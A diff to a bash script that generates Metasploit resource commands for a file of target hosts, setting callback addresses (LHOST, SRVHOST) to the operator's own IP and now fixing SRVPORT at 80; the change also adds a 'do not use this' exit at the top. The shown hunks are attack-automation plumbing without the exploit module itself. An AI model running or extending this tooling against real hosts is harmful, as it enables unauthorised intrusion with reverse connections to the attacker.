@@ -2,9 +2,20 @@
 # 20210523 kirby
 
 
+echo "do not use this"
+exit 1
+
+
 if [[ ! -f "$1" ]]
 then
     echo "must supply file of hosts"
+    exit
+fi
+
+if netstat -peanut |grep -q ":80 "
+then
+    echo "SRV port 80 is already in use"
+    echo "Change SRV port or shutdown service on port 80"
     exit
 fi
 
@@ -12,7 +23,6 @@ fi
 cmdfile="${1}.msfcmd"
 report="${1}.report"
 lport=20000
-srvport=2000
 myip=$(ip addr show dev $(ip route |awk '/default/ {print $5}')|awk '/inet / {print $2}' |cut -d'/' -f1)
 echo 'color false' > "$cmdfile"
 BORDER='##################################################' 
@@ -87,16 +97,6 @@ function echocmd()
             let lport++
         done
 
-        let srvport++
-        if [[ $srvport == 9999 ]]
-        then
-            srvport=2000
-        fi
-        while netstat -ant|grep LISTEN |grep ":$srvport " >/dev/null 2>&1
-        do
-            let srvport++
-        done
-
         if [[ $SSL == "false" ]]
         then
             TARGETURI="http://$host:$port"
@@ -115,7 +115,7 @@ function echocmd()
         echo "set VERBOSE false" >> "$cmdfile"
         echo "set LPORT $lport" >> "$cmdfile"
         echo "set LHOST $myip" >> "$cmdfile"
-        echo "set SRVPORT $srvport" >> "$cmdfile"
+        echo "set SRVPORT 80" >> "$cmdfile"
         echo "set SRVHOST $myip" >> "$cmdfile"
         echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
         echo "set SSL $SSL" >> "$cmdfile"
